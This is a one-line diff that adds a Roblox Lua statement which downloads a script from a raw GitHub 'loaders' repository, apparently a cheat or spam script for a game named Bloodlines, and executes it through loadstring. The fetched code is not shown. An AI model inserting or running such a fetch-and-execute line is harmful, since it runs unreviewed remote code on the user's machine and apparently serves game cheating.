@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/bloodlines-spam5-y7dmbqa8lq49s0.lua"))()
